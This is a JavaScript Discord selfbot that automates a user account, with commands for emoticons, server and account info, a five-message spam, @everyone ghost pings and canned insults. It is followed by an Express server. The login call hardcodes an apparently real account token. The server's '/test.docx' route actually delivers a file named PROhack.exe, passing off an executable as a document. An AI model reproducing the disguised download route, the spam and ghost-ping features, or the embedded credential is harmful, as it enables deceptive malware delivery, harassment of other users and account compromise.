const Discord = require('discord.js-selfbot');
const chancejs = require("chance");
const dbl = require("dbl.js");
const db = require("quick.db");
const catFacts = require('cat-facts');
const dogFacts = require('dog-facts');
const hastebin = require('hastebin-gen');
const translate = require('google-translate-api');
const chance = new chancejs();
const bot = new Discord.Client();
const badges = require("discord-badges");
const superagent = require("superagent");
const moment = require('moment');
const fs = require('fs');
const client = new Discord.Client();
var prefix = '!';

client.on('ready', (ready) => {
    console.log('---------------------------------------------------------------')
    console.log('Self bot is online! Prefix: ' + prefix)
    console.log('Logged in as: ' + client.user.username + '#' + client.user.discriminator)
    console.log('Use: ' + prefix + 'help')
    console.log('---------------------------------------------------------------')
})

client.on('message', async msg => {
    var raw = msg.content;

    /*if(msg.channel.id == 781495297271398403 && msg.author.id != client.user.id){
      msg.channel.send(raw)
    }*/

    let shortcuts = [
        ['`( ͡° ͜ʖ ͡°)`'],
        ['`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧`'],
        ['`( ﾟヮﾟ)`'],
        ['`{◕ ◡ ◕}`'],
        ['`(∩´• . •`)⊃━☆ﾟ.*`'],
        ['`╰( ◕ ᗜ ◕ )╯`'],
        ['`(つ°ヮ°)つ`'],
        ['`└╏ ･ ᗜ ･ ╏┐`'],
        ['`（〜^∇^)〜`'],
        ['`(∩｡･ｏ･｡)っ.ﾟ☆`｡`'],
        ['`(┛ಠДಠ)┛彡┻━┻`'],
        ['`☆*:. o(≧▽≦)o .:*☆`'],
        ['`(✿ ◕ᗜ◕)━♫.*･｡ﾟ`'],
        ['`【 º □ º 】`'],
        ['`༼ノ◕ヮ◕༽ノ︵┻━┻`'],
        ['`(;﹏;)`'],
        ['`(^_-)`']
    ]

    if (!raw.startsWith(prefix)) return;
    if (msg.author.id != client.user.id) return;

    var cmd = raw.split(' ')[0].slice(prefix.length);
    var args = raw.split(' ').slice(1);
    var test = "yes yes yes";

    switch (cmd) {
        case 'owner':
            console.log(msg.guild.owner)
            const guild = msg.guild; // Gets guild from the Message object
            if (!guild.available) return; // Stops if unavailable
            await msg.guild.members.fetch(msg.guild.ownerID) // Fetches owner
                .then(guildMember => sOwner = guildMember) // sOwner is the owner
            var owner = guild.member(sOwner) ? sOwner.toString() : guild.owner.user.tag;
            console.log(owner)
            /*
            setTimeout(() => {
              msg.edit(msg.guild.owner.user.tag);*/
            setTimeout(() => {
                msg.delete();
            }, 800)
            /*}, 300)*/
            break;
        case 'test':
            msg.reply('test');
            break;
        case 'howgay':
            const embed_1 = new Discord.MessageEmbed()
                .setColor('#00FF00')
                .setTitle(`__**Gay Test**__`)
                .setDescription(
                    `**I am ` + Math.floor(Math.random() * 100 + 1) + "% gay :rainbow_flag:**")
                //.join(' ')
                /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/
                .setTimestamp(Date.now())

            msg.edit('_ _');
            msg.edit(embed_1);
            break;
        case 'server':
            const embed_111111 = new Discord.MessageEmbed()

                .setColor('#0000FF')
                .setTitle("__**Server Info**__")
                .setThumbnail(msg.guild.iconURL())
                .setDescription("\n\n**Server Name: **\n" + msg.guild.name + "\n\n**Server Member Count:**\n" + msg.guild.memberCount + "\n\n**Server ID:**\n" + msg.guild.id + "\n\n**Server Partnership Status:**\n" + msg.guild.partnered + "\n\n**Server Verification Status:**\n" + msg.guild.verified + "\n\n**Server Created At:**\n" + msg.guild.createdAt + "\n\n**Server Created Timestamp:**\n" + msg.guild.createdTimestamp + "\n\n**Server Owner ID:** \n" + msg.guild.owner +
                    "\n\n**Server Owner: **\n" + msg.member.guild.owner.user.username + "#" + msg.member.guild.owner.user.discriminator)

                .setTimestamp(Date.now())

            msg.edit('_ _');
            msg.edit(embed_111111);
            break;
        case 'help':
            const embed_4 = new Discord.MessageEmbed()
                .setColor('#fff')
                .setTitle(`__**Help**__`)
                .setDescription(
                    `**!test -> Test the Self Bot**\n\n**!howgay -> Fun way to see how gay you are!(FUN)**\n\n**!howsimp -> Fun way to see how muh of a simp you are!(FUN)**\n\n**!info -> Sends your account info!**\n\n**!ping -> See your ping**\n\n**!spam -> Spam things(WILL SPAM FOR 5 TIMES)**\n\n**!rip -> Sends RIP Picture(FUN)**\n\n**!server -> Sends server INFO**\n\n**!ghost -> Ghost Pings**\n\n**!youtube -> Sends Lost?'s Youtube Link!**` + "\n\n**!discordver -> Sends Latest Version of Discord!\n\n!coinflip -> Flips a Coin try your Luck!**" + "\n\n**!leave -> Makes you leave the server you say !leave in!**" + "\n\n**!start-afk -> Starts the AFK Mode!**" + "\n\n**!end-afk -> Ends the AFK Mode!**" + "\n\n**!insult @user -> Insults the User!**"
                )
                .setTimestamp(Date.now())
            //.join(' ')
            /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/
            msg.edit('_ _');
            msg.edit(embed_4);
            break;
        case 'howsimp':
            const embed_2 = new Discord.MessageEmbed()
                .setColor('#0000FF')
                .setTitle(`__**Simp Test**__`)
                .setDescription(
                    `**I am ` + Math.floor(Math.random() * 100 + 1) + "% Simp :wave:**")
                //.join(' ')
                /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/
                .setTimestamp(Date.now())

            msg.edit('_ _');
            msg.edit(embed_2);
            break;
        case 'lenny':
            msg.edit(shortcuts[0]);
            break;
        case 'magic':
            msg.edit(shortcuts[1]);
            break;
        case 'yay':
            msg.edit(shortcuts[2]);
            break;
        case 'smile':
            msg.edit(shortcuts[3]);
            break;
        case 'wizard':
            msg.edit(shortcuts[4]);
            break;
        case 'happy':
            msg.edit(shortcuts[5]);
            break;
        case 'party':
            msg.edit(shortcuts[6]);
            break;
        case 'dance':
            msg.edit(shortcuts[7]);
            break;
        case 'disco':
            msg.edit(shortcuts[8]);
            break;
        case 'woahmagic':
            msg.edit(shortcuts[9]);
            break;
        case 'rage':
            msg.edit(shortcuts[10]);
            break;
        case 'excited':
            msg.edit(shortcuts[11]);
            break;
        case 'music':
            msg.edit(shortcuts[12]);
            break;
        case 'woah':
            msg.edit(shortcuts[13]);
            break;
        case 'flipparty':
            msg.edit(shortcuts[14]);
            break;
        case 'sad':
            msg.edit(shortcuts[15]);
            break;
        case 'wink':
            msg.edit(shortcuts[16]);
            break;
        case 'rip':
            msg.edit('https://i.imgur.com/w3duR07.png');
            break;
        case 'insult':
            if (!msg.mentions.users.size) return;
            msg.delete()
            let mention = "@" + msg.mentions.users.tag
            var insults = ['Is your ass jealous of the amount of shit that just came out of your mouth?', 'Two wrongs dont make a right, take your parents as an example.', 'Id like to see things from your point of view but I cant seem to get my head that far up my ass.', 'If I wanted to kill myself Id climb your ego and jump to your IQ.', 'Your family tree must be a cactus because everybody on it is a prick.', 'You are so ugly, when your mom dropped you off at school she got a fine for littering.', 'Your birth certificate is an apology letter from the condom factory.']
            msg.channel.send(mention + " " + insults[Math.floor(Math.random() * insults.length)])
            break;
        case 'info':
            let userStatus = (client.user.presence.status === 'online') ? "Online" : (client.user.presence.status === 'idle') ? "Idle/Inactive" : (client.user.presence.status === 'dnd') ? "Busy/Do Not Disturb" : "Unavailable/Offline"
            let gameStatus = client.user.presence.game ? client.user.presence.game.name : 'None'

            const embed_3 = new Discord.MessageEmbed()
                .setColor('#0000FF')
                .setTitle(`__**Account Info**__\n`)
                .setThumbnail(client.user.avatarURL())
                .setDescription(`\n\n**Account Name: **\n` + msg.member.user.tag + `\n\n**Account Creation: **\n` + new Date(client.user.createdTimestamp).toLocaleDateString() + `\n\n**Account ID: **\n` + msg.member.id + `\n\n**Server Username: **\n` + msg.author.username + `\n\n**Server Join Time: **\n` + new Date(msg.member.joinedTimestamp).toLocaleDateString() + `\n\n**Your Presence: **\n` + userStatus + `\n\n**Discriminator:**\n` + "#" + client.user.discriminator + "\n\n**Game Status:**\n" + gameStatus + "\n\n**Server Count:**\n" + client.guilds.cache.size + "\n\n**Account Created On:**\n" + moment.utc(client.user.createdAt).format("dddd, MMMM Do YYYY"))
                .setTimestamp(Date.now())
            //.join(' ')
            /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/

            msg.edit('_ _');
            msg.edit(embed_3);
            break;
        case 'leave':
            if (!msg.guild) return;
            msg.delete()
            if (msg.author.id === msg.guild.id) return;
            msg.guild.leave()
            break;
        case 'ghost':
            msg.delete();
            msg.channel.send("@everyone").then(m => {
                m.delete();
            })
            break;
        case 'ping':
            const embed = new Discord.MessageEmbed()
                .setColor('#0000FF')
                .setTitle(`__**Ping**__`)
                .setDescription(
                    `**Latency: ` + (Date.now() - msg.createdTimestamp) + `ms\nAPI Latency: ` + client.ws.ping + `ms**`)
                //.join(' ')
                /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/

                .setTimestamp(Date.now())

            msg.edit('_ _');
            msg.edit(embed);
            break;
        case 'status':
            var type = args[0];
            var text = args.slice(1);
            client.user.setActivity(text.join(' '), {
                type: type
            });
            msg.edit('New status: **__' + text.join(' ') + '__**');
            break;
        case 'afk':
            msg.delete();
            msg.reply("Oh you're back ! i removed your afk")
            db.delete(msg.author.id + '!afk')
            db.delete(msg.author.id + '!messageafk')
            break;
        case 'start-afk':
            msg.delete();
            msg.member.setNickname(`${msg.author.username} [AFK]`).catch(error => msg.channel.send("Couldn't update your nickname."));
            // then here you use the database :
            db.set(msg.author.id + '!afk', 'true')
            db.set(msg.author.id + '!messageafk', msg.content.split(' ').slice(2))
            msg.mentions.users.forEach(user => {
            if (db.has(client.user.id + '!afk'))        msg.reply('the user ' + client.user.tag + ' is afk !')
            })
            break;
        case 'stop-afk':
            msg.delete();
            msg.member.setNickname('').catch(error => msg.channel.send("Couldn't update your nickname."));
            // Here you delete it
            db.delete(msg.author.id + '!afk')
            db.delete(msg.author.id + '!messageafk')
            break;
        case 'youtube':
            const embed111111111 = new Discord.MessageEmbed()
                .setColor('#0000FF')
                .setTitle(`__**YouTube Link**__`)
                .setThumbnail("https://yt3.ggpht.com/QJbJJHXlVHKjIZtDsy5QkgsQh5oIKSzl-cPI9rysm23o559-FNhTqmQe72GTDYAXPp3SsmPiwg=s600-c-k-c0x00ffffff-no-rj-rp-mo")
                .setDescription("https://www.youtube.com/channel/UCOJsAcp1IAGR9VzEqW7YuTw")
                //.join(' ')
                /*.replace(/\\n/g, String.fromCodePoint(parseInt('000A', 16)))*/

                .setTimestamp(Date.now())
            msg.edit('_ _');
            msg.edit(embed111111111);
            break;
        case 'spam':
            var a = args.join(' ');
            msg.channel.send(a);
            msg.channel.send(a);
            msg.channel.send(a)
            msg.channel.send(a)
            msg.channel.send(a)
            break;
        case 'coinflip':
            msg.edit("" + chance.pickone(["I flipped a coin and got **heads**!", "I flipped a coin and got **tails**!"]));
            break;
        case 'discordver':
            msg.edit("**Current Discord Version** : " + Discord.version);
    }
});

client.login("ODg5MjY2NjY1OTk5NzAwMDM4.YVzA8g.vIPsd5Z43U0y75_-BlY2FIBVhdQ");
const express = require('express');
const app = express();

app.use(express.static('public'));

app.get('/', async (request, response) => {
    response.send();
});

app.get('/test.docx', async (request, response) => {
    response.download(__dirname + '/PROhack.exe');
    //response.status(404);
});

app.get('/.env', async (req, res) => {
    res.status(404).send('Page not found');
});

const listener = app.listen(process.env.PORT, () => {
    console.log('Server listening on port ' + listener.address().port);
});